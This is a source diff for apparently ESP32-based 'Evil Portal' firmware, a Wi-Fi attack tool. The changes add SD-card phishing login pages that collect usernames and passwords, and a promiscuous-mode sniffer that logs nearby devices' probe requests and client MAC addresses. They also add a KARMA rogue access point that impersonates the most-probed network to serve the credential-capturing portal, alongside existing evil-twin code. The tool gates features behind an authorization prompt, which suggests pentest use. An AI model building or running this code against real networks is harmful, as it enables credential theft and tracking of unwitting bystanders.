@@ -17,13 +17,16 @@
 #include <ctype.h>
 #include <errno.h>
 #include <sys/stat.h>
+#include <dirent.h>
 #include <string>
 #include <vector>
 #include <mutex>
+#include <algorithm>
 
 #ifdef ARDUINO
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <esp_wifi_types.h>
 #include <esp_netif.h>
 #include <DNSServer.h>
 #endif
@@ -134,6 +137,22 @@ static const builtin_template_t BUILTIN_TEMPLATES[] = {
 };
 #define BUILTIN_COUNT (sizeof(BUILTIN_TEMPLATES) / sizeof(BUILTIN_TEMPLATES[0]))
 
+/* Custom pages are self-contained static login forms. IDs 0..99 are reserved for
+ * firmware pages; SD pages use stable IDs 100..115 in filename order. */
+#define CUSTOM_TEMPLATE_BASE 100
+#define CUSTOM_TEMPLATE_MAX 16
+#define CUSTOM_TEMPLATE_BYTES 65536
+static const char CUSTOM_TEMPLATE_DIR[] = "/sd/data/evilportal/portals";
+typedef struct {
+    int id;
+    std::string name;
+    std::string host_path;
+} custom_template_t;
+static std::vector<custom_template_t> s_custom_templates;
+static std::mutex s_templates_mx;
+static std::string s_custom_html;
+static char s_template_error[96] = "";
+
 /* ── SSID presets ── */
 static const char *SSID_PRESETS[] = {
     "Free Wi-Fi", "Free WiFi", "WiFi Guest", "Guest Wi-Fi",
@@ -171,9 +190,29 @@ static unsigned long s_deauth_frames = 0;
 static bool s_cloning = false;
 static char s_clone_name[64] = "";
 static bool s_karma_scanning = false;
-static int  s_karma_count = 0;
-static char s_karma_ssids[32][33];
-static int  s_karma_hits[32];
+static uint32_t s_karma_scan_end_ms = 0;
+static int s_karma_channel = 1;
+static uint32_t s_karma_last_hop_ms = 0;
+#define KARMA_PROBE_LIMIT 32
+#define KARMA_CLIENT_LIMIT 8
+typedef struct {
+    char ssid[33];
+    int hits;
+    int rssi;
+    int channel;
+    long long last_seen;
+    char last_client[18];
+    char clients[KARMA_CLIENT_LIMIT][18];
+    int client_count;
+} karma_probe_t;
+static karma_probe_t s_karma_probes[KARMA_PROBE_LIMIT];
+static int s_karma_count = 0;
+static std::mutex s_karma_mx;
+
+#define EP_RADIO_OWNER "Evil Portal"
+#ifdef ARDUINO
+static bool s_reconnect = false;
+#endif
 
 typedef struct {
     char mac[18];
@@ -189,6 +228,7 @@ static std::mutex s_captures_mx;
 
 static void url_decode(char *dst, size_t dst_len, const char *src, size_t src_len);
 static void setup_log_path(void);
+static void finish_karma_scan(void);
 static void set_error(const char *text)
 {
     snprintf(s_error, sizeof(s_error), "%s", text ? text : "");
@@ -237,6 +277,97 @@ static void url_decode(char *dst, size_t dst_len, const char *src, size_t src_le
         } else { *d++ = *src++; }
     }
     *d = 0;
+}
+
+/* ═══════════════════════════════════════════════ SD template catalog ══════ */
+
+static bool valid_template_filename(const char *name)
+{
+    size_t n = strlen(name);
+    if (n < 6 || n > 64 || name[0] == '.' || strcmp(name + n - 5, ".html")) return false;
+    for (size_t i = 0; i < n; i++) {
+        unsigned char c = (unsigned char)name[i];
+        if (!isalnum(c) && c != '-' && c != '_' && c != '.') return false;
+    }
+    return strstr(name, "..") == NULL;
+}
+
+/* Read and validate again when selected: a card can change after the listing. */
+static bool read_custom_template(const std::string &path, std::string &html)
+{
+    struct stat st;
+    web_plat_io_lock();
+    bool ok = stat(path.c_str(), &st) == 0 && S_ISREG(st.st_mode) && st.st_size > 0 && st.st_size <= CUSTOM_TEMPLATE_BYTES;
+    FILE *f = ok ? fopen(path.c_str(), "rb") : NULL;
+    web_plat_io_unlock();
+    if (!f) return false;
+    html.resize((size_t)st.st_size);
+    web_plat_io_lock();
+    size_t got = fread(&html[0], 1, html.size(), f);
+    fclose(f);
+    web_plat_io_unlock();
+    if (got != html.size() || html.find('\0') != std::string::npos) return false;
+
+    std::string compact;
+    compact.reserve(html.size());
+    for (unsigned char c : html) {
+        if (c == ' ' || c == '\t' || c == '\r' || c == '\n') continue;
+        compact += (char)tolower(c);
+    }
+    const bool form = compact.find("<form") != std::string::npos &&
+        (compact.find("method='post'") != std::string::npos || compact.find("method=\"post\"") != std::string::npos || compact.find("method=post") != std::string::npos) &&
+        (compact.find("action='/login'") != std::string::npos || compact.find("action=\"/login\"") != std::string::npos || compact.find("action=/login") != std::string::npos) &&
+        (compact.find("name='username'") != std::string::npos || compact.find("name=\"username\"") != std::string::npos || compact.find("name=username") != std::string::npos) &&
+        (compact.find("name='password'") != std::string::npos || compact.find("name=\"password\"") != std::string::npos || compact.find("name=password") != std::string::npos);
+    const bool safe = compact.find("<script") == std::string::npos && compact.find("<iframe") == std::string::npos &&
+        compact.find("<object") == std::string::npos && compact.find("<embed") == std::string::npos &&
+        compact.find("src=") == std::string::npos && compact.find("href=") == std::string::npos &&
+        compact.find("http:") == std::string::npos && compact.find("https:") == std::string::npos;
+    return form && safe && compact.find("<html") != std::string::npos && compact.find("</html>") != std::string::npos;
+}
+
+static int scan_custom_templates(int *rejected = NULL)
+{
+    std::vector<custom_template_t> found;
+    int bad = 0;
+    if (web_fs_sd_mounted()) {
+        std::string root;
+        if (web_fs_resolve(CUSTOM_TEMPLATE_DIR, root) == 0) {
+            std::vector<std::string> names;
+            web_plat_io_lock();
+            DIR *dir = opendir(root.c_str());
+            if (dir) {
+                while (struct dirent *entry = readdir(dir)) {
+                    if (valid_template_filename(entry->d_name)) names.push_back(entry->d_name);
+                    else if (strcmp(entry->d_name, ".") && strcmp(entry->d_name, "..")) bad++;
+                }
+                closedir(dir);
+            }
+            web_plat_io_unlock();
+            std::sort(names.begin(), names.end());
+            for (const std::string &name : names) {
+                if (found.size() >= CUSTOM_TEMPLATE_MAX) { bad++; continue; }
+                custom_template_t item;
+                item.id = CUSTOM_TEMPLATE_BASE + (int)found.size();
+                item.name = name.substr(0, name.size() - 5);
+                item.host_path = root + "/" + name;
+                std::string html;
+                if (!read_custom_template(item.host_path, html)) { bad++; continue; }
+                found.push_back(item);
+            }
+        }
+    }
+    {
+        std::lock_guard<std::mutex> lk(s_templates_mx);
+        s_custom_templates.swap(found);
+        /* IDs stay contiguous after invalid files are omitted. */
+        for (size_t i = 0; i < s_custom_templates.size(); i++) s_custom_templates[i].id = CUSTOM_TEMPLATE_BASE + (int)i;
+    }
+    if (bad) snprintf(s_template_error, sizeof(s_template_error), "%d invalid or unsupported SD template(s) omitted", bad);
+    else s_template_error[0] = 0;
+    if (rejected) *rejected = bad;
+    std::lock_guard<std::mutex> lk(s_templates_mx);
+    return (int)s_custom_templates.size();
 }
 
 /* ═══════════════════════════════════════════════ Captive portal handler ═════ */
@@ -381,7 +512,8 @@ static void status_json(web_req_t *r)
         j += "}";
     }
     if (s_error[0]) { j += ",\"error\":"; web_json_str(j, s_error); }
-    /* Templates */
+    /* Templates: builtins plus validated files that persist on the SD card. */
+    if (!s_active) scan_custom_templates();
     j += ",\"templates\":[";
     for (size_t i = 0; i < BUILTIN_COUNT; i++) {
         if (i) j += ",";
@@ -389,7 +521,17 @@ static void status_json(web_req_t *r)
         web_json_str(j, BUILTIN_TEMPLATES[i].name);
         j += ",\"builtin\":true}";
     }
-    j += "]";
+    {
+        std::lock_guard<std::mutex> lk(s_templates_mx);
+        for (const custom_template_t &item : s_custom_templates) {
+            j += ",{\"id\":" + tools_int(item.id) + ",\"name\":";
+            web_json_str(j, item.name.c_str());
+            j += ",\"builtin\":false,\"source\":\"sd\"}";
+        }
+    }
+    j += "],\"templateError\":";
+    if (s_template_error[0]) web_json_str(j, s_template_error); else j += "null";
+    j += ",\"karmaScanning\":" + std::string(s_karma_scanning ? "true" : "false");
     /* SSID presets */
     j += ",\"ssidPresets\":[";
     for (size_t i = 0; i < SSID_PRESET_COUNT; i++) {
@@ -415,19 +557,29 @@ static void status_json(web_req_t *r)
 
 /* ── Shared portal lifecycle (HTTP and native watch UI) ── */
 
-#define EP_RADIO_OWNER "Evil Portal"
-#ifdef ARDUINO
-static bool s_reconnect = false;
-#endif
-
 static int portal_begin(int mode, const char *ssid, int template_idx, const char *gateway,
                         const char *twin_bssid, int channel, bool coherent)
 {
-    if (s_active) { set_error("Portal already running"); return 409; }
-    if (mode == EP_MODE_KARMA) { set_error("KARMA probe capture is not implemented in this firmware"); return 503; }
+    if (s_active || s_karma_scanning) { set_error(s_active ? "Portal already running" : "Stop probe discovery first"); return 409; }
     if (coherent) { set_error("WPA2-coherent twin mode is not implemented; use open twin mode"); return 503; }
     if (!ssid || !*ssid || strlen(ssid) > 32) { set_error("SSID must be 1-32 UTF-8 bytes"); return 400; }
-    if (template_idx < 0 || template_idx >= (int)BUILTIN_COUNT) { set_error("Unknown portal template"); return 400; }
+
+    std::string selected_html;
+    if (template_idx >= 0 && template_idx < (int)BUILTIN_COUNT) {
+        selected_html = BUILTIN_TEMPLATES[template_idx].html;
+    } else {
+        custom_template_t selected = {};
+        bool found = false;
+        {
+            std::lock_guard<std::mutex> lk(s_templates_mx);
+            for (const custom_template_t &item : s_custom_templates) {
+                if (item.id == template_idx) { selected = item; found = true; break; }
+            }
+        }
+        if (!found || !read_custom_template(selected.host_path, selected_html)) {
+            set_error("Unknown, changed or invalid SD portal template"); return 400;
+        }
+    }
     if (channel < 1 || channel > 13) { set_error("Channel must be 1-13"); return 400; }
     if (gateway && *gateway) {
         if (!valid_ipv4(gateway)) { set_error("Gateway must be a valid IPv4 address"); return 400; }
@@ -444,7 +596,8 @@ static int portal_begin(int mode, const char *ssid, int template_idx, const char
     s_mode = mode;
     snprintf(s_ssid, sizeof(s_ssid), "%s", ssid);
     s_template_idx = template_idx;
-    s_active_template = BUILTIN_TEMPLATES[template_idx].html;
+    s_custom_html = selected_html;
+    s_active_template = s_custom_html.c_str();
     s_started = tools_epoch();
     s_attempts = s_confirmed = 0;
     s_clients = s_probes_total = 0;
@@ -573,25 +726,67 @@ static void start_twin(web_req_t *r)
     web_resp_json(r, 200, j);
 }
 
-/* ── Start: KARMA ── */
+/* ── Start: KARMA, using an SSID learned by passive probe discovery ── */
+
+static bool best_karma_ssid(const std::string &wanted, char out[33])
+{
+    std::lock_guard<std::mutex> lk(s_karma_mx);
+    const karma_probe_t *best = NULL;
+    for (int i = 0; i < s_karma_count; i++) {
+        if (!wanted.empty() && wanted != s_karma_probes[i].ssid) continue;
+        if (!best || s_karma_probes[i].hits > best->hits) best = &s_karma_probes[i];
+    }
+    if (!best) return false;
+    snprintf(out, 33, "%s", best->ssid);
+    return true;
+}
 
 static void start_karma(web_req_t *r)
 {
     if (tools_busy(r, APPS)) return;
-    std::string body;
+    std::string body, wanted, gateway;
+    double template_idx = 0, channel = 1;
     if (!tools_read_json(r, body)) return;
     if (!authorized(body)) {
         web_resp_error(r, 400, "authorization_required", "Confirm that you own or may test this network"); return;
     }
-    web_resp_error(r, 503, "unavailable", "KARMA probe capture is not implemented in this firmware");
+    web_json_get_str(body, "ssid", wanted);
+    web_json_get_str(body, "gateway", gateway);
+    if (web_json_has(body, "templateId") && !web_json_get_num(body, "templateId", &template_idx)) {
+        web_resp_error(r, 400, "bad_request", "templateId must be a number"); return;
+    }
+    if (web_json_has(body, "channel") && (!web_json_get_num(body, "channel", &channel) || channel < 1 || channel > 13)) {
+        web_resp_error(r, 400, "bad_request", "channel must be 1-13"); return;
+    }
+    char ssid[33];
+    if (!best_karma_ssid(wanted, ssid)) {
+        web_resp_error(r, 409, "conflict", wanted.empty() ? "Run probe discovery first" : "Requested SSID was not discovered"); return;
+    }
+    finish_karma_scan();
+    int rc = portal_begin(EP_MODE_KARMA, ssid, (int)template_idx,
+                          gateway.empty() ? NULL : gateway.c_str(), NULL, (int)channel, false);
+    if (rc) { web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : rc == 503 ? "busy" : "ap_failed", s_error); return; }
+    std::string j = "{\"ok\":true,\"mode\":\"karma\",\"ssid\":";
+    web_json_str(j, s_ssid);
+    j += "}";
+    web_resp_json(r, 200, j);
 }
 
 /* ── Stop ── */
 
 static void stop_portal(web_req_t *r)
 {
+    finish_karma_scan();
     portal_finish();
     web_resp_ok(r);
+}
+
+static void reload_templates(web_req_t *r)
+{
+    int rejected = 0;
+    int count = scan_custom_templates(&rejected);
+    std::string extra = "\"count\":" + tools_int(count) + ",\"rejected\":" + tools_int(rejected);
+    web_resp_ok(r, extra.c_str());
 }
 
 /* ── Captures ── */
@@ -680,22 +875,148 @@ static void update_settings(web_req_t *r)
     web_resp_ok(r);
 }
 
-/* ── KARMA scan ── */
+/* ── Passive KARMA probe discovery ── */
+
+static void record_probe(const char *ssid, const char *client, int rssi, int channel)
+{
+    if (!ssid || !*ssid || strlen(ssid) > 32) return;
+    std::lock_guard<std::mutex> lk(s_karma_mx);
+    karma_probe_t *probe = NULL;
+    for (int i = 0; i < s_karma_count; i++) {
+        if (!strcmp(s_karma_probes[i].ssid, ssid)) { probe = &s_karma_probes[i]; break; }
+    }
+    if (!probe) {
+        if (s_karma_count >= KARMA_PROBE_LIMIT) return;
+        probe = &s_karma_probes[s_karma_count++];
+        memset(probe, 0, sizeof(*probe));
+        snprintf(probe->ssid, sizeof(probe->ssid), "%s", ssid);
+    }
+    probe->hits++;
+    probe->rssi = rssi;
+    probe->channel = channel;
+    probe->last_seen = tools_epoch();
+    if (client && strlen(client) == 17) {
+        snprintf(probe->last_client, sizeof(probe->last_client), "%s", client);
+        bool known = false;
+        for (int i = 0; i < probe->client_count; i++) if (!strcmp(probe->clients[i], client)) known = true;
+        if (!known && probe->client_count < KARMA_CLIENT_LIMIT) {
+            snprintf(probe->clients[probe->client_count++], 18, "%s", client);
+        }
+    }
+}
+
+#ifdef ARDUINO
+static void karma_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
+{
+    (void)type;
+    if (!s_karma_scanning || !buf) return;
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *f = pkt->payload;
+    size_t len = pkt->rx_ctrl.sig_len;
+    if (len < 25 || f[0] != 0x40) return; /* probe request, including retries */
+    char client[18];
+    snprintf(client, sizeof(client), "%02x:%02x:%02x:%02x:%02x:%02x",
+             f[10], f[11], f[12], f[13], f[14], f[15]);
+    size_t off = 24;
+    while (off + 2 <= len) {
+        uint8_t tag = f[off], n = f[off + 1];
+        if (off + 2 + n > len) break;
+        if (tag == 0) {
+            if (n > 0 && n <= 32) {
+                char ssid[33] = {};
+                memcpy(ssid, f + off + 2, n);
+                record_probe(ssid, client, pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel);
+            }
+            return;
+        }
+        off += 2 + n;
+    }
+}
+#endif
+
+/* 0 on success, otherwise an HTTP status. */
+static int begin_karma_scan(int seconds)
+{
+    if (s_active || s_karma_scanning) return 409;
+    if (seconds < 1 || seconds > 120) return 400;
+    std::string radio_error;
+    if (!tools_wifi_claim(EP_RADIO_OWNER, radio_error)) { set_error(radio_error.c_str()); return 503; }
+    {
+        std::lock_guard<std::mutex> lk(s_karma_mx);
+        memset(s_karma_probes, 0, sizeof(s_karma_probes));
+        s_karma_count = 0;
+    }
+    set_error("");
+    s_karma_channel = 1;
+    s_karma_last_hop_ms = 0;
+    s_karma_scan_end_ms = tools_now_ms() + (uint32_t)seconds * 1000;
+    s_karma_scanning = true;
+#ifdef ARDUINO
+    s_reconnect = WiFi.status() == WL_CONNECTED;
+    WiFi.mode(WIFI_STA);
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    esp_err_t rc = esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+    if (rc == ESP_OK) rc = esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
+    if (rc == ESP_OK) rc = esp_wifi_set_promiscuous(true);
+    if (rc != ESP_OK) {
+        finish_karma_scan();
+        set_error("Wi-Fi promiscuous mode could not start");
+        return 500;
+    }
+#endif
+    return 0;
+}
+
+static void finish_karma_scan(void)
+{
+    if (!s_karma_scanning) return;
+    s_karma_scanning = false;
+#ifdef ARDUINO
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    if (s_reconnect) WiFi.reconnect();
+    s_reconnect = false;
+#endif
+    tools_wifi_release(EP_RADIO_OWNER);
+}
 
 static void karma_scan(web_req_t *r)
 {
+    if (tools_busy(r, APPS)) return;
     std::string body;
+    double seconds = 30;
     if (!tools_read_json(r, body)) return;
-    web_resp_error(r, 503, "unavailable", "KARMA probe scanning is not implemented in this firmware");
+    if (!authorized(body)) {
+        web_resp_error(r, 400, "authorization_required", "Confirm that you own or may test this network"); return;
+    }
+    if (web_json_has(body, "seconds") && (!web_json_get_num(body, "seconds", &seconds) || seconds < 1 || seconds > 120)) {
+        web_resp_error(r, 400, "bad_request", "seconds must be 1-120"); return;
+    }
+    int rc = begin_karma_scan((int)seconds);
+    if (rc) {
+        web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : rc == 503 ? "busy" : "unavailable",
+                       rc == 409 ? "Stop the portal or current probe discovery first" : s_error);
+        return;
+    }
+    std::string j = "{\"ok\":true,\"scanning\":true,\"seconds\":" + tools_int((long long)seconds) + "}";
+    web_resp_json(r, 202, j);
 }
 
 static void karma_list(web_req_t *r)
 {
-    std::string j = "{\"probes\":[";
+    std::lock_guard<std::mutex> lk(s_karma_mx);
+    std::string j = std::string("{\"scanning\":") + (s_karma_scanning ? "true" : "false") + ",\"probes\":[";
     for (int i = 0; i < s_karma_count; i++) {
         if (i) j += ",";
-        j += "{\"ssid\":"; web_json_str(j, s_karma_ssids[i]);
-        j += ",\"hits\":" + tools_int(s_karma_hits[i]) + "}";
+        j += "{\"ssid\":"; web_json_str(j, s_karma_probes[i].ssid);
+        j += ",\"hits\":" + tools_int(s_karma_probes[i].hits) +
+            ",\"clients\":" + tools_int(s_karma_probes[i].client_count) +
+            ",\"rssi\":" + tools_int(s_karma_probes[i].rssi) +
+            ",\"channel\":" + tools_int(s_karma_probes[i].channel) +
+            ",\"last_seen\":" + tools_int(s_karma_probes[i].last_seen);
+        j += ",\"lastClient\":"; web_json_str(j, s_karma_probes[i].last_client);
+        j += "}";
     }
     j += "]}";
     web_resp_json(r, 200, j);
@@ -747,13 +1068,19 @@ static bool handle(web_req_t *r)
         } else if (action == "client") {
             if (s_clients < 16) s_clients++;
         } else if (action == "probe") {
-            std::string ssid;
+            if (!s_karma_scanning) { web_resp_error(r, 409, "conflict", "start probe discovery first"); return true; }
+            std::string ssid, client;
+            double hits = 1, rssi = -60, channel = 1;
             web_json_get_str(body, "ssid", ssid);
-            if (!ssid.empty() && s_karma_count < 32) {
-                snprintf(s_karma_ssids[s_karma_count], 33, "%s", ssid.c_str());
-                s_karma_hits[s_karma_count] = 1;
-                s_karma_count++;
+            web_json_get_str(body, "mac", client);
+            web_json_get_num(body, "hits", &hits);
+            web_json_get_num(body, "rssi", &rssi);
+            web_json_get_num(body, "channel", &channel);
+            if (client.empty()) client = "02:00:00:00:00:01";
+            if (ssid.empty() || ssid.size() > 32 || hits < 1 || hits > 100) {
+                web_resp_error(r, 400, "bad_request", "ssid: 1-32 bytes; hits: 1-100"); return true;
             }
+            for (int i = 0; i < (int)hits; i++) record_probe(ssid.c_str(), client.c_str(), (int)rssi, (int)channel);
         } else {
             web_resp_error(r, 400, "bad_request", "unknown simulator action"); return true;
         }
@@ -770,6 +1097,7 @@ static bool handle(web_req_t *r)
     else if (tools_is(r, "POST", "/api/evilportal/stop"))         stop_portal(r);
     else if (tools_is(r, "GET", "/api/evilportal/captures"))      get_captures(r);
     else if (tools_is(r, "POST", "/api/evilportal/clear"))        clear_captures(r);
+    else if (tools_is(r, "POST", "/api/evilportal/templates/reload")) reload_templates(r);
     else if (tools_is(r, "PUT", "/api/evilportal/settings"))      update_settings(r);
     else if (tools_is(r, "POST", "/api/evilportal/karma-scan"))   karma_scan(r);
     else if (tools_is(r, "GET", "/api/evilportal/karma"))         karma_list(r);
@@ -870,6 +1198,16 @@ static void send_twin_deauth(void)
 
 static void evilportal_tick(uint32_t now_ms)
 {
+    if (s_karma_scanning) {
+        if ((int32_t)(now_ms - s_karma_scan_end_ms) >= 0) finish_karma_scan();
+        else if (now_ms - s_karma_last_hop_ms >= 250) {
+            s_karma_last_hop_ms = now_ms;
+#ifdef ARDUINO
+            esp_wifi_set_channel(s_karma_channel, WIFI_SECOND_CHAN_NONE);
+#endif
+            s_karma_channel = s_karma_channel % 13 + 1;
+        }
+    }
     if (!s_active) return;
 #ifdef ARDUINO
     s_dns.processNextRequest();
@@ -901,12 +1239,25 @@ static void evilportal_tick(uint32_t now_ms)
     }
 }
 
-static void evilportal_stop(void) { portal_finish(); }
+static void evilportal_stop(void) { finish_karma_scan(); portal_finish(); }
 
-int web_hw_evilportal_template_count(void) { return (int)BUILTIN_COUNT; }
+int web_hw_evilportal_template_count(void)
+{
+    return (int)BUILTIN_COUNT + scan_custom_templates();
+}
 const char *web_hw_evilportal_template_name(int idx)
 {
-    return idx >= 0 && idx < (int)BUILTIN_COUNT ? BUILTIN_TEMPLATES[idx].name : "";
+    if (idx >= 0 && idx < (int)BUILTIN_COUNT) return BUILTIN_TEMPLATES[idx].name;
+    std::lock_guard<std::mutex> lk(s_templates_mx);
+    int custom = idx - (int)BUILTIN_COUNT;
+    return custom >= 0 && custom < (int)s_custom_templates.size() ? s_custom_templates[custom].name.c_str() : "";
+}
+int web_hw_evilportal_template_id(int idx)
+{
+    if (idx >= 0 && idx < (int)BUILTIN_COUNT) return idx;
+    std::lock_guard<std::mutex> lk(s_templates_mx);
+    int custom = idx - (int)BUILTIN_COUNT;
+    return custom >= 0 && custom < (int)s_custom_templates.size() ? s_custom_templates[custom].id : -1;
 }
 bool web_hw_evilportal_template_is_builtin(int idx) { return idx >= 0 && idx < (int)BUILTIN_COUNT; }
 int web_hw_evilportal_ssid_count(void) { return (int)SSID_PRESET_COUNT; }
@@ -929,8 +1280,14 @@ bool web_hw_evilportal_start_twin(int template_idx, const char *ssid, const uint
     snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
     return portal_begin(EP_MODE_TWIN, ssid, template_idx, NULL, mac, channel, coherent) == 0;
 }
-bool web_hw_evilportal_start_karma(int template_idx) { (void)template_idx; return false; }
-bool web_hw_evilportal_stop(void) { portal_finish(); return true; }
+bool web_hw_evilportal_start_karma(int template_idx)
+{
+    char ssid[33];
+    if (!best_karma_ssid("", ssid)) { set_error("Run probe discovery first"); return false; }
+    finish_karma_scan();
+    return portal_begin(EP_MODE_KARMA, ssid, template_idx, NULL, NULL, 1, false) == 0;
+}
+bool web_hw_evilportal_stop(void) { finish_karma_scan(); portal_finish(); return true; }
 void web_hw_evilportal_status(web_hw_evilportal_t *out)
 {
     if (!out) return;
@@ -985,14 +1342,15 @@ const char *web_hw_evilportal_gateway(void) { return s_gateway; }
 void web_hw_evilportal_set_auto_stop(uint16_t base_s, uint16_t extended_s) { s_auto_base_s = base_s; s_auto_extended_s = extended_s; }
 void web_hw_evilportal_set_debug(bool on) { s_debug = on; }
 bool web_hw_evilportal_debug(void) { return s_debug; }
-int web_hw_evilportal_karma_start(int secs) { (void)secs; return -1; }
-bool web_hw_evilportal_karma_busy(void) { return false; }
+int web_hw_evilportal_karma_start(int secs) { return -begin_karma_scan(secs); }
+bool web_hw_evilportal_karma_busy(void) { return s_karma_scanning; }
 int web_hw_evilportal_karma_count(void) { return s_karma_count; }
-const char *web_hw_evilportal_karma_ssid(int i) { return i >= 0 && i < s_karma_count ? s_karma_ssids[i] : ""; }
-int web_hw_evilportal_karma_hits(int i) { return i >= 0 && i < s_karma_count ? s_karma_hits[i] : 0; }
+const char *web_hw_evilportal_karma_ssid(int i) { return i >= 0 && i < s_karma_count ? s_karma_probes[i].ssid : ""; }
+int web_hw_evilportal_karma_hits(int i) { return i >= 0 && i < s_karma_count ? s_karma_probes[i].hits : 0; }
 
 static const char *const CAPS[] = {
-    "evil.portal", "evil.portal.templates", "evil.portal.twin", "evil.portal.settings", NULL
+    "evil.portal", "evil.portal.templates", "evil.portal.customTemplates", "evil.portal.twin",
+    "evil.portal.karma", "evil.portal.settings", NULL
 };
 const web_tool_t web_tool_evilportal = { CAPS, handle, evilportal_tick, NULL, evilportal_stop };
 
